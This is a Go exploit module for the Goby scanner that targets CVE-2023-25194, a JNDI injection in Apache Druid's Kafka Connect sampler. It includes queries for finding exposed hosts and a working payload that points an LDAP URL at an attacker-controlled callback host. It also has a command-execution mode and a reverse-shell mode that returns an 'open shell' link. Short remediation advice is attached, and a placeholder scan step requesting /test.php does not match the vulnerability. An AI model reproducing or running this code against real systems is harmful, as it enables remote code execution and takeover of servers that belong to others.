package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Kafka Connect remote code execution vulnerability (CVE-2023-25194)",
    "Description": "<p>Apache Druid is an open source distributed data storage and analysis system. It is designed to handle large-scale real-time data and provide fast interactive query and analysis.</p><p>Apache Druid uses the vulnerable Kafka Connect. An attacker can access the Kafka Connect Worker and create or modify the connector by setting the sasl.jaas.config attribute to a malicious class, which can lead to a JNDI injection vulnerability. This vulnerability can be used Execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "APACHE-Druid",
    "Homepage": "https://druid.apache.org/",
    "DisclosureDate": "2023-02-07",
    "PostTime": "2024-03-07",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"Apache Druid console\" || title=\"Apache Druid\" || header=\"unified-console.html\" || banner=\"unified-console.html\"",
    "GobyQuery": "body=\"Apache Druid console\" || title=\"Apache Druid\" || header=\"unified-console.html\" || banner=\"unified-console.html\"",
    "Level": "3",
    "Impact": "<p>Apache Druid uses the vulnerable Kafka Connect. An attacker can access the Kafka Connect Worker and create or modify the connector by setting the sasl.jaas.config attribute to a malicious class, which can lead to a JNDI injection vulnerability. This vulnerability can be used Execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz\">https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-25194"
    ],
    "CNNVD": [
        "CNNVD-202302-515"
    ],
    "CNVD": [
        "CNVD-2023-23554"
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "Apache Druid Kafka Connect 远程代码执行漏洞（CVE-2023-25194）",
            "Product": "APACHE-Druid",
            "Description": "<p>Apache Druid 是一个开源的分布式数据存储和分析系统。它设计用于处理大规模的实时数据，并提供快速的交互式查询和分析。</p><p>Apache Druid 使用了存在漏洞的 Kafka Connect，攻击者可访问Kafka Connect Worker，且可以创建或修改连接器时，通过设置sasl.jaas.config属性为恶意类，进而可导致JNDI注入漏洞，可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz\">https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Apache Druid 使用了存在漏洞的 Kafka Connect，攻击者可访问Kafka Connect Worker，且可以创建或修改连接器时，通过设置sasl.jaas.config属性为恶意类，进而可导致JNDI注入漏洞，可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache Kafka Connect remote code execution vulnerability (CVE-2023-25194)",
            "Product": "APACHE-Druid",
            "Description": "<p>Apache Druid is an open source distributed data storage and analysis system. It is designed to handle large-scale real-time data and provide fast interactive query and analysis.</p><p>Apache Druid uses the vulnerable Kafka Connect. An attacker can access the Kafka Connect Worker and create or modify the connector by setting the sasl.jaas.config attribute to a malicious class, which can lead to a JNDI injection vulnerability. This vulnerability can be used Execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz\">https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Apache Druid uses the vulnerable Kafka Connect. An attacker can access the Kafka Connect Worker and create or modify the connector by setting the sasl.jaas.config attribute to a malicious class, which can lead to a JNDI injection vulnerability. This vulnerability can be used Execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10933"
}`

	vulnerabilityCheckda32783dnmasu1287 := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		loopholesRequestConfig := httpclient.NewPostRequestConfig("/druid/indexer/v1/sampler?for=connect")
		loopholesRequestConfig.FollowRedirect = false
		loopholesRequestConfig.VerifyTls = false
		loopholesRequestConfig.Header.Store("Content-Type", "application/json")
		loopholesRequestConfig.Header.Store("cmd", cmd)
		loopholesRequestConfig.Data = `{
    "type":"kafka",
    "spec":{
        "type":"kafka",
        "ioConfig":{
            "type":"kafka",
            "consumerProperties":{
                "bootstrap.servers":"127.0.0.1:6666",
                "sasl.mechanism":"SCRAM-SHA-256",
                "security.protocol":"SASL_SSL",
                "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://` + godclient.GetGodServerHost() + `/A8\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
            },
            "topic":"test",
            "useEarliestOffset":true,
            "inputFormat":{
                "type":"regex",
                "pattern":"([\\s\\S]*)",
                "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                "columns":[
                    "raw"
                ]
            }
        },
        "dataSchema":{
            "dataSource":"sample",
            "timestampSpec":{
                "column":"!!!_no_such_column_!!!",
                "missingValue":"1970-01-01T00:00:00Z"
            },
            "dimensionsSpec":{

            },
            "granularitySpec":{
                "rollup":false
            }
        },
        "tuningConfig":{
            "type":"kafka"
        }
    },
    "samplerConfig":{
        "numRows":500,
        "timeoutMs":15000
    }
}`
		return httpclient.DoHttpRequest(hostInfo, loopholesRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, _ := vulnerabilityCheckda32783dnmasu1287(hostinfo, "echo "+checkString)
			return resp != nil && strings.Contains(resp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			if attackType == "cmd" {
				if resp, err := vulnerabilityCheckda32783dnmasu1287(expResult.HostInfo, goutils.B2S(stepLogs.Params["cmd"])); resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				vulnerabilityCheckda32783dnmasu1287(expResult.HostInfo, fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
